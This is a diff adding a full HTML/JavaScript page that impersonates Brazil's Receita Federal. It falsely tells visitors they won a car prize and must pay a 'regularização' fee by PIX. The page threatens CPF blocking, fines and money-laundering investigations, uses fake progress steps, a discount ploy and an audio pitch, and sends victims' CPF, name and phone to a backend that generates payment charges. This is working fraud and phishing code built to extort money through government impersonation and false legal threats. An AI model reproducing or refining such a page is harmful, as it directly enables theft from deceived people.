@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <title>Receita Federal - Regularização</title>
+  <style>
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    body { background-color:#EAEEF3; display:flex; justify-content:center; margin:0; font-family:'Poppins',sans-serif; -webkit-font-smoothing:antialiased; }
+    div#content { width:100%; max-width:600px; min-height:100vh; background-color:#fff; box-shadow:0 0 40px rgba(0,0,0,0.08); }
+    img { vertical-align:middle; display:inline-block; height:auto; max-width:100%; }
+
+    /* ── Progress tracker ── */
+    .progress-container {
+      width:100%; padding:30px 20px 10px; display:flex; align-items:flex-start; justify-content:center; gap:6px; margin-bottom:20px;
+    }
+    .progress-container > div { flex:1; position:relative; display:flex; flex-direction:column; align-items:center; }
+    .progress-item { display:flex; align-items:center; gap:6px; width:100%; }
+    .progress-bar { flex:1; height:5px; border-radius:99px; background:#D4D9E2; }
+    .progress-bar2 { width:0; height:5px; border-radius:99px; background-color:#4CAF50; transition:width 0.8s ease-out; }
+    .check-container { width:42px; flex-shrink:0; }
+    .check-container > img { width:42px; height:42px; border-radius:50%; }
+    .check-container > .check-svg { width:42px; height:42px; }
+    .step-label { margin-top:8px; font-size:11px; font-weight:600; color:#555; text-align:center; line-height:1.3; min-height:30px; }
+
+    /* ── Section ── */
+    section#more-information {
+      display:flex; flex-direction:column; align-items:center; padding:10px 24px 40px;
+      opacity:0; transition:opacity 1.5s ease-out;
+    }
+    section > .alert-badge {
+      display:inline-flex; align-items:center; gap:6px;
+      background:#FFF0F0; border:1px solid #FFCDD2; color:#D32F2F;
+      font-size:13px; font-weight:700; padding:8px 18px; border-radius:99px; margin-bottom:14px; letter-spacing:0.5px;
+    }
+    section > .alert-badge::before { content:'⚠️'; font-size:16px; }
+    section > h1 { font-size:22px; color:#C62828; font-weight:800; margin-bottom:8px; text-align:center; }
+    section > h2 { font-size:16px; color:#333; font-weight:600; margin-bottom:20px; text-align:center; }
+    section > p { text-align:center; margin-bottom:18px; line-height:1.65; font-size:14px; color:#444; max-width:520px; }
+    span.bold { font-weight:700; color:#222; }
+    span.bold2 { font-weight:700; color:#1565C0; }
+    span.bold3 { font-weight:700; color:#2E7D32; }
+    span.bold4 { font-weight:700; color:#C62828; }
+
+    .divider { width:60px; height:3px; background:linear-gradient(90deg,#C62828,#EF5350); border-radius:99px; margin:10px 0 22px; }
+
+    /* ── Buttons ── */
+    .btn-primary {
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      font-family:'Poppins',sans-serif; font-size:18px; font-weight:700; letter-spacing:0.5px;
+      border-radius:12px; padding:16px 36px; border:none; cursor:pointer; color:#fff;
+      background:linear-gradient(135deg,#1565C0,#1E88E5,#42A5F5);
+      box-shadow:0 6px 20px rgba(21,101,192,0.35);
+      transition:transform 0.2s, box-shadow 0.2s;
+      margin:8px 0 28px;
+    }
+    .btn-primary:hover { transform:translateY(-2px); box-shadow:0 8px 26px rgba(21,101,192,0.45); }
+    .btn-primary:active { transform:translateY(0); }
+    .btn-primary:disabled { opacity:0.45; cursor:not-allowed; transform:none; box-shadow:none; }
+
+    .btn-danger {
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      font-family:'Poppins',sans-serif; font-size:18px; font-weight:700;
+      border-radius:12px; padding:16px 36px; border:none; cursor:pointer; color:#fff;
+      background:linear-gradient(135deg,#C62828,#E53935,#EF5350);
+      box-shadow:0 6px 20px rgba(198,40,40,0.35);
+      transition:transform 0.2s, box-shadow 0.2s;
+      margin:8px 0 10px;
+    }
+    .btn-danger:hover { transform:translateY(-2px); box-shadow:0 8px 26px rgba(198,40,40,0.45); }
+
+    .btn-green {
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      font-family:'Poppins',sans-serif; font-size:18px; font-weight:700;
+      border-radius:12px; padding:16px 36px; border:none; cursor:pointer; color:#fff;
+      background:linear-gradient(135deg,#2E7D32,#43A047,#66BB6A);
+      box-shadow:0 6px 20px rgba(46,125,50,0.35);
+      transition:transform 0.2s, box-shadow 0.2s;
+      margin:15px 0 0;
+    }
+    .btn-green:hover { transform:translateY(-2px); box-shadow:0 8px 26px rgba(46,125,50,0.45); }
+
+    .warning-box {
+      background:#FFF8E1; border:1px solid #FFE082; border-radius:10px; padding:16px 20px;
+      margin-top:20px; max-width:520px;
+    }
+    .warning-box p { text-align:center; font-size:13px; line-height:1.6; color:#5D4037; margin:0; }
+
+    /* ── Modal ── */
+    .modal { display:none; position:fixed; z-index:100; left:0; top:0; width:100%; height:100%; overflow:auto; background:rgba(0,0,0,0.5); justify-content:center; align-items:center; backdrop-filter:blur(4px); }
+    .modal-content {
+      background:#fff; padding:28px 24px; border:none; width:88%; max-width:460px; max-height:95vh; overflow-y:auto;
+      box-shadow:0 20px 60px rgba(0,0,0,0.25); border-radius:16px; position:relative;
+    }
+    .modal-content > div#step1 { display:flex; flex-direction:column; align-items:center; transition:opacity 0.3s ease-out; }
+    .modal-content > div#step1 > h1 { font-size:20px; line-height:1.3; color:#222; font-weight:700; text-align:center; margin-bottom:8px; }
+    .modal-content > div#step1 > p { text-align:center; font-size:15px; line-height:1.5; font-weight:400; color:#666; }
+    div#trace { margin:20px 0; width:100%; }
+    .modal-content > div#step2 { display:none; flex-direction:column; align-items:center; }
+    .modal-content > div#step2 > p { font-size:15px; line-height:1.5; text-align:center; color:#444; }
+    .modal-content > div#step2 > span#value {
+      color:#fff; background:linear-gradient(135deg,#C62828,#E53935); font-size:22px; font-weight:800;
+      text-align:center; display:inline-block; margin:16px 0; padding:10px 24px; border-radius:10px;
+    }
+    .modal-content > div#step2 > .discount-label { font-size:14px; color:#2E7D32; font-weight:600; margin-top:24px; text-align:center; }
+    .modal-content > div#step2 > h1 { font-size:24px; text-align:center; color:#2E7D32; font-weight:700; margin-top:6px; margin-bottom:8px; }
+    .modal-content > div#step2 > h1#value2 {
+      font-size:48px; font-weight:900; color:#1565C0;
+      background:linear-gradient(135deg,#1565C0,#42A5F5); -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+      margin-bottom:16px;
+    }
+    .audio-box {
+      background:#F5F5F5; border-radius:12px; padding:14px 18px; margin:12px 0 8px; width:100%; text-align:center;
+    }
+    .audio-box .audio-label { font-size:13px; font-weight:700; color:#C62828; margin-bottom:8px; display:flex; align-items:center; justify-content:center; gap:6px; }
+    .audio-box .audio-label::before { content:'🔊'; }
+
+    /* WhatsApp-style audio player */
+    .wpp-player {
+      display:flex; align-items:center; gap:10px;
+      background:#DCF8C6; border-radius:20px; padding:8px 14px;
+      max-width:320px; margin:8px auto 0; width:100%;
+    }
+    .wpp-player .wpp-play-btn {
+      width:40px; height:40px; border-radius:50%; border:none; cursor:pointer;
+      background:#25D366; color:#fff; display:flex; align-items:center; justify-content:center;
+      flex-shrink:0; transition:background 0.2s;
+    }
+    .wpp-player .wpp-play-btn:hover { background:#1EBE5A; }
+    .wpp-player .wpp-play-btn svg { width:18px; height:18px; fill:#fff; }
+    .wpp-player .wpp-track { flex:1; display:flex; flex-direction:column; gap:4px; }
+    .wpp-player .wpp-progress-bar {
+      width:100%; height:4px; background:#B2DFDB; border-radius:99px; cursor:pointer; position:relative;
+    }
+    .wpp-player .wpp-progress-fill {
+      height:100%; background:#075E54; border-radius:99px; width:0%; transition:width 0.1s linear; position:relative;
+    }
+    .wpp-player .wpp-progress-fill::after {
+      content:''; position:absolute; right:-5px; top:50%; transform:translateY(-50%);
+      width:12px; height:12px; background:#075E54; border-radius:50%; box-shadow:0 1px 3px rgba(0,0,0,0.3);
+    }
+    .wpp-player .wpp-time { font-size:11px; color:#555; font-weight:500; display:flex; justify-content:space-between; }
+    .wpp-player .wpp-speed-btn {
+      font-size:11px; font-weight:700; color:#075E54; background:#B2DFDB; border:none;
+      border-radius:10px; padding:3px 8px; cursor:pointer; flex-shrink:0; font-family:'Poppins',sans-serif;
+    }
+
+    /* ── PIX Popup ── */
+    #pixPopup { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.6); display:none; align-items:center; justify-content:center; z-index:1000; backdrop-filter:blur(4px); }
+    .pix-content {
+      position:relative; background:#fff; padding:28px 24px; border-radius:16px; max-width:380px; width:92%; text-align:center;
+      box-shadow:0 20px 60px rgba(0,0,0,0.25);
+    }
+    .pix-content .close-btn { position:absolute; top:12px; right:14px; background:transparent; border:none; font-size:1.6rem; line-height:1; cursor:pointer; color:#999; transition:color 0.2s; }
+    .pix-content .close-btn:hover { color:#333; }
+    .pix-content h2 { font-size:20px; font-weight:700; color:#222; margin-bottom:12px; }
+    .pix-content img { max-width:180px; margin-bottom:12px; border-radius:8px; }
+    .pix-content code {
+      display:block; background:#F0F4F8; padding:12px; margin:10px 0; word-break:break-all;
+      border-radius:8px; font-size:11px; color:#333; border:1px solid #E0E0E0;
+    }
+    .pix-content .total-label { font-size:14px; color:#555; margin-bottom:8px; font-weight:600; }
+    .pix-content button.pix-btn {
+      box-sizing:border-box; display:block; width:100%; padding:14px; font-size:15px; font-weight:700;
+      margin-top:8px; border-radius:12px; border:none; color:#fff; cursor:pointer;
+      background:linear-gradient(135deg,#1565C0,#1E88E5,#42A5F5);
+      box-shadow:0 4px 14px rgba(21,101,192,0.3); transition:transform 0.2s, box-shadow 0.2s;
+      font-family:'Poppins',sans-serif;
+    }
+    .pix-content button.pix-btn:hover { transform:translateY(-1px); box-shadow:0 6px 20px rgba(21,101,192,0.4); }
+    #pix-copy-msg { display:none; color:#2E7D32; text-align:center; margin-top:8px; font-weight:600; font-size:14px; }
+    #pix-waiting { text-align:center; margin-top:12px; font-size:13px; color:#888; }
+    .pix-spinner { display:inline-block; width:16px; height:16px; border:2px solid #ccc; border-top-color:#1565C0; border-radius:50%; animation:spin 0.8s linear infinite; vertical-align:middle; margin-right:6px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.03)} }
+    .pulse { animation:pulse 2s ease-in-out infinite; }
+  </style>
+</head>
+<body>
+  <div id="content">
+    <img fetchpriority="high" width="607" height="89" src="images/bannerrr-rf.png" alt="Receita Federal">
+
+    <div class="progress-container">
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar1"></div>
+          <div class="check-container" id="check1">
+            <svg class="check-svg" id="img1" viewBox="0 0 42 42"><circle cx="21" cy="21" r="20" fill="#E0E0E0"/><path d="M12 21l6 6 12-12" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+        <span class="step-label">Pagamento Recebido</span>
+      </div>
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar2"></div>
+          <div class="check-container" id="check2">
+            <svg class="check-svg" id="img2" viewBox="0 0 42 42"><circle cx="21" cy="21" r="20" fill="#E0E0E0"/><path d="M12 21l6 6 12-12" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+        <span class="step-label">Dados Recebidos</span>
+      </div>
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar3"></div>
+          <div class="check-container" id="check3">
+            <svg class="check-svg" id="img3" viewBox="0 0 42 42"><circle cx="21" cy="21" r="20" fill="#E0E0E0"/><path d="M12 21l6 6 12-12" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+        <span class="step-label">Preparando Para Envio</span>
+      </div>
+      <div>
+        <div class="progress-item">
+          <div class="progress-bar" id="bar4"></div>
+          <div class="check-container" id="check4">
+            <svg class="check-svg" id="img4" viewBox="0 0 42 42"><circle cx="21" cy="21" r="20" fill="#E0E0E0"/><path d="M12 21l6 6 12-12" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+        </div>
+        <span class="step-label">Entrega</span>
+      </div>
+    </div>
+
+    <section id="more-information">
+      <div class="alert-badge">LEIA COM ATENÇÃO</div>
+      <h2>Regularização de Premiação</h2>
+      <div class="divider"></div>
+      <p>
+        Parabéns! Durante a conferência do seu <span class="bold">Bilhete Premiado</span> no programa <span class="bold">Viva Sorte</span>, foi identificado que para a liberação do seu prêmio é obrigatória a emissão da
+        <span class="bold">Nota Fiscal de Premiação</span>, conforme normas da Receita Federal.
+      </p>
+      <p>Essa taxa única é necessária para a entrega oficial do seu prêmio. <span class="bold">Como a premiação é de alto valor,</span> você precisará da nota fiscal do carro <span class="bold">para comprovar à Receita Federal</span> a origem do bem.</p>
+
+      <button class="btn-primary pulse" id="show-offer" disabled>🔓 REGULARIZAR ENTREGA</button>
+
+      <h1>O que acontece se você não pagar?</h1>
+      <div class="divider"></div>
+      <p>O não pagamento da nota fiscal <span class="bold">pode ser interpretado como indício de Lavagem De Dinheiro,</span> resultando em investigação pela polícia, já que você não justificou a origem do valor nem explicou por que um bem desse porte está em seu nome.</p>
+
+      <div class="warning-box">
+        <p><span class="bold">⚠️ OBS:</span> A dívida ficará registrada em seu CPF, com aplicação de multa de 10% sobre o valor do carro e possível bloqueio temporário do seu CPF, conforme o art. 45 do Decreto-Lei 37/66.</p>
+      </div>
+
+      <p style="margin-top:18px;">Evite complicações desnecessárias enquanto ainda há tempo.</p>
+    </section>
+  </div>
+
+  <!-- Modal Regularização -->
+  <div id="offer-modal" class="modal">
+    <div class="modal-content">
+      <div id="step1">
+        <h1>Processando Regularização...</h1>
+        <div id="trace" class="progress-bar2"></div>
+        <p>Aguarde enquanto finalizamos a emissão.</p>
+      </div>
+      <div id="step2">
+        <p>VALOR DA REGULARIZAÇÃO:</p>
+        <span id="value">R$ 1.436,90</span>
+        <p>Mas o Viva Sorte vai arcar com <span class="bold3">90% do valor</span>, pois você ganhou uma condição especial. Pague apenas <span class="bold2">R$ 178,39</span> com a parceria oficial do programa <span class="bold2">Viva Sorte</span>.</p>
+
+        <p class="discount-label">✅ REGULARIZAÇÃO POR APENAS:</p>
+        <h1 id="value2">R$ 178,39</h1>
+
+        <div class="audio-box">
+          <p class="audio-label">OUÇA O ÁUDIO DO RENATO</p>
+          <audio id="wppAudio" preload="metadata" src="media/audio-renato.mp3"></audio>
+          <div class="wpp-player" id="wppPlayer">
+            <button class="wpp-play-btn" id="wppPlayBtn">
+              <svg id="wppIconPlay" viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
+              <svg id="wppIconPause" viewBox="0 0 24 24" style="display:none;"><rect x="5" y="3" width="4" height="18"/><rect x="15" y="3" width="4" height="18"/></svg>
+            </button>
+            <div class="wpp-track">
+              <div class="wpp-progress-bar" id="wppProgressBar">
+                <div class="wpp-progress-fill" id="wppProgressFill"></div>
+              </div>
+              <div class="wpp-time">
+                <span id="wppCurrent">0:00</span>
+                <span id="wppDuration">0:00</span>
+              </div>
+            </div>
+            <button class="wpp-speed-btn" id="wppSpeedBtn">1x</button>
+          </div>
+        </div>
+
+        <button class="btn-green pulse" id="liberarEntregaBtn">✅ LIBERAR ENTREGA</button>
+
+        <div class="warning-box" style="margin-top:16px;">
+          <p>
+            <span class="bold4">⚠️ Atenção:</span> O não pagamento implicará multa de até <span class="bold4">R$ 10.247,00</span> no CPF: <span class="bold4" id="cpf-aviso"></span> e bloqueio temporário do seu CPF, conforme o art. 45 do Decreto-Lei 37/66.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PIX Popup -->
+  <div id="pixPopup">
+    <div class="pix-content">
+      <button class="close-btn" onclick="closePixPopup()">&times;</button>
+      <div id="pixLoadingStep" style="display:none;text-align:center;padding:2rem 0;">
+        <div class="pix-spinner"></div>
+        <p style="margin-top:12px;font-size:15px;color:#555;">Gerando cobrança PIX…</p>
+      </div>
+      <div id="pixResultStep" style="display:none;">
+        <h2>PIX Gerado ✅</h2>
+        <p style="color:#222;font-size:14px;font-weight:700;margin-bottom:8px;">NOME DO RECEBEDOR: <span style="color:#E53935;" id="nomeRecebedorPix">---</span></p>
+        <div id="pixTotalDisplay" class="total-label"></div>
+        <img id="pixQrImg" src="" alt="QR Code PIX">
+        <code id="pixCode">-- aguardando código --</code>
+        <button class="pix-btn" id="copyPixBtn">📋 Copiar Código PIX</button>
+        <p id="pix-copy-msg">✅ Código copiado!</p>
+        <p id="pix-waiting"><span class="pix-spinner"></span> Aguardando confirmação do pagamento...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var SUPABASE_URL = 'https://szbkjhvhmnoldiztzwwc.supabase.co';
+    var SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN6YmtqaHZobW5vbGRpenR6d3djIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQzOTg3NTYsImV4cCI6MjA4OTk3NDc1Nn0.59OPwUZopUlGtgJtj0zJD_N4T-cib-ON-kCxgLVIUI4';
+    var envioTransactionId = null;
+    var envioPixInterval = null;
+
+    function getParameterByName(name) {
+      var url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+      var results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    function closePixPopup() {
+      document.getElementById('pixPopup').style.display = 'none';
+      if (envioPixInterval) clearInterval(envioPixInterval);
+    }
+
+    function animateBar(barId, imgId) {
+      var traco = document.getElementById(barId);
+      var startTime = null;
+      window.requestAnimationFrame(function step(timestamp) {
+        if (!startTime) startTime = timestamp;
+        var progress = timestamp - startTime;
+        var percentage = Math.min(progress / 900, 1);
+        traco.style.background = 'linear-gradient(to right, #4CAF50 ' + (100 * percentage) + '%, #D4D9E2 ' + (100 * percentage) + '%)';
+        if (progress < 900) {
+          window.requestAnimationFrame(step);
+        } else {
+          traco.style.background = '#4CAF50';
+          var svgEl = document.getElementById(imgId);
+          if (imgId === 'img3') {
+            svgEl.innerHTML = '<circle cx="21" cy="21" r="20" fill="#E53935"/><line x1="14" y1="14" x2="28" y2="28" stroke="#fff" stroke-width="3" stroke-linecap="round"/><line x1="28" y1="14" x2="14" y2="28" stroke="#fff" stroke-width="3" stroke-linecap="round"/>';
+          } else {
+            svgEl.innerHTML = '<circle cx="21" cy="21" r="20" fill="#4CAF50"/><path d="M12 21l6 6 12-12" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>';
+          }
+        }
+      });
+    }
+
+    function showProgressAndCheck(barId, checkId, imgId, textId, delay) {
+      setTimeout(function() {
+        animateBar(barId, imgId);
+        setTimeout(function() {
+          if (checkId === 'check3') {
+            setTimeout(function() {
+              document.getElementById('more-information').style.opacity = 1;
+              document.getElementById('show-offer').disabled = false;
+            }, 1500);
+          }
+        }, 900);
+      }, delay);
+    }
+
+    function extrairNomeRecebedor(pixCode) {
+      try {
+        var i = 0;
+        while (i < pixCode.length - 4) {
+          var id = pixCode.substring(i, i + 2);
+          var len = parseInt(pixCode.substring(i + 2, i + 4), 10);
+          if (isNaN(len)) break;
+          var val = pixCode.substring(i + 4, i + 4 + len);
+          if (id === '59') return val;
+          i += 4 + len;
+        }
+      } catch(e) {}
+      return '';
+    }
+
+    function gerarPixEnvio() {
+      var cpf = getParameterByName('document') || '';
+      var nome = getParameterByName('name') || '';
+      var telefone = getParameterByName('phone') || '';
+      var utm = getParameterByName('utm_source') || '';
+
+      var pixPopup = document.getElementById('pixPopup');
+      pixPopup.style.display = 'flex';
+      document.getElementById('pixLoadingStep').style.display = 'block';
+      document.getElementById('pixResultStep').style.display = 'none';
+      document.getElementById('pixTotalDisplay').innerText = 'Total: R$ 178,39';
+
+      fetch(SUPABASE_URL + '/functions/v1/create-pix', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apikey': SUPABASE_ANON,
+          'Authorization': 'Bearer ' + SUPABASE_ANON
+        },
+        body: JSON.stringify({
+          cpf: cpf,
+          nome: nome,
+          telefone: telefone,
+          quantidade: 1,
+          tipo: 'taxa-envio',
+          utm: utm
+        })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (!data.success) {
+          alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
+          closePixPopup();
+          return;
+        }
+        envioTransactionId = data.transaction_id;
+        document.getElementById('pixLoadingStep').style.display = 'none';
+        document.getElementById('pixResultStep').style.display = 'block';
+
+        if (data.qr_code_image) {
+          document.getElementById('pixQrImg').src = data.qr_code_image;
+          document.getElementById('pixQrImg').style.display = 'block';
+        } else {
+          document.getElementById('pixQrImg').style.display = 'none';
+        }
+
+        var pixKey = data.codigo_pix || data.qr_code || '';
+        document.getElementById('pixCode').innerText = pixKey;
+        var nomeRec = extrairNomeRecebedor(pixKey);
+        if (nomeRec) document.getElementById('nomeRecebedorPix').textContent = nomeRec;
+
+        document.getElementById('copyPixBtn').onclick = function() {
+          navigator.clipboard.writeText(pixKey)
+            .then(function() {
+              var msg = document.getElementById('pix-copy-msg');
+              msg.style.display = 'block';
+              setTimeout(function() { msg.style.display = 'none'; }, 3000);
+            })
+            .catch(function() { alert('Falha ao copiar.'); });
+        };
+
+        envioPixInterval = setInterval(function() {
+          fetch(SUPABASE_URL + '/functions/v1/check-pix', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'apikey': SUPABASE_ANON,
+              'Authorization': 'Bearer ' + SUPABASE_ANON
+            },
+            body: JSON.stringify({ transaction_id: envioTransactionId })
+          })
+          .then(function(r) { return r.json(); })
+          .then(function(res) {
+            if (res.status === 'COMPLETED' || res.status === 'APPROVED' || res.status === 'paid') {
+              clearInterval(envioPixInterval);
+              document.getElementById('pixResultStep').innerHTML =
+                '<div style="text-align:center;padding:2rem 0;">' +
+                '<p style="font-size:20px;color:#2E7D32;font-weight:bold;">✅ Pagamento confirmado!</p>' +
+                '<p style="margin-top:8px;color:#555;">Seu prêmio será enviado em breve.</p>' +
+                '</div>';
+            }
+          }).catch(function(){});
+        }, 5000);
+      })
+      .catch(function() {
+        alert('Erro ao gerar o PIX. Tente novamente.');
+        closePixPopup();
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      var cpfLead = getParameterByName('document') || '';
+      var cpfFormatado = cpfLead.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      var cpfEl = document.getElementById('cpf-aviso');
+      if (cpfEl) cpfEl.textContent = cpfFormatado || 'Não informado';
+
+      showProgressAndCheck('bar1', 'check1', 'img1', 'text1', 0);
+      showProgressAndCheck('bar2', 'check2', 'img2', 'text2', 2000);
+      showProgressAndCheck('bar3', 'check3', 'img3', 'text3', 4000);
+
+      var modal = document.getElementById('offer-modal');
+
+      document.getElementById('show-offer').addEventListener('click', function() {
+        modal.style.display = 'flex';
+        setTimeout(function() {
+          var trace = document.getElementById('trace');
+          if (trace) {
+            trace.style.width = '100%';
+            setTimeout(function() {
+              var step1 = document.getElementById('step1');
+              var step2 = document.getElementById('step2');
+              step1.style.opacity = 0;
+              setTimeout(function() {
+                step1.style.display = 'none';
+                step2.style.display = 'flex';
+              }, 400);
+            }, 2000);
+          }
+        }, 800);
+      });
+
+      document.getElementById('liberarEntregaBtn').addEventListener('click', function() {
+        modal.style.display = 'none';
+        gerarPixEnvio();
+      });
+
+      window.addEventListener('click', function(event) {
+        if (event.target == modal) modal.style.display = 'none';
+      });
+
+      // WhatsApp-style audio player
+      var audio = document.getElementById('wppAudio');
+      var playBtn = document.getElementById('wppPlayBtn');
+      var iconPlay = document.getElementById('wppIconPlay');
+      var iconPause = document.getElementById('wppIconPause');
+      var progressBar = document.getElementById('wppProgressBar');
+      var progressFill = document.getElementById('wppProgressFill');
+      var currentTime = document.getElementById('wppCurrent');
+      var durationEl = document.getElementById('wppDuration');
+      var speedBtn = document.getElementById('wppSpeedBtn');
+      var speeds = [1, 1.5, 2];
+      var speedIdx = 0;
+
+      function fmtTime(s) {
+        var m = Math.floor(s / 60);
+        var sec = Math.floor(s % 60);
+        return m + ':' + (sec < 10 ? '0' : '') + sec;
+      }
+
+      audio.addEventListener('loadedmetadata', function() {
+        durationEl.textContent = fmtTime(audio.duration);
+      });
+
+      audio.addEventListener('timeupdate', function() {
+        if (audio.duration) {
+          progressFill.style.width = (audio.currentTime / audio.duration * 100) + '%';
+          currentTime.textContent = fmtTime(audio.currentTime);
+        }
+      });
+
+      audio.addEventListener('ended', function() {
+        iconPlay.style.display = 'block';
+        iconPause.style.display = 'none';
+        progressFill.style.width = '0%';
+        currentTime.textContent = '0:00';
+      });
+
+      playBtn.addEventListener('click', function() {
+        if (audio.paused) {
+          audio.play();
+          iconPlay.style.display = 'none';
+          iconPause.style.display = 'block';
+        } else {
+          audio.pause();
+          iconPlay.style.display = 'block';
+          iconPause.style.display = 'none';
+        }
+      });
+
+      progressBar.addEventListener('click', function(e) {
+        var rect = progressBar.getBoundingClientRect();
+        var pct = (e.clientX - rect.left) / rect.width;
+        audio.currentTime = pct * audio.duration;
+      });
+
+      speedBtn.addEventListener('click', function() {
+        speedIdx = (speedIdx + 1) % speeds.length;
+        audio.playbackRate = speeds[speedIdx];
+        speedBtn.textContent = speeds[speedIdx] + 'x';
+      });
+    });
+  </script>
+
+  <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+  <script>
+    window.pixelId = "69676e03d69da956a6a46829";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+</body>
+</html>
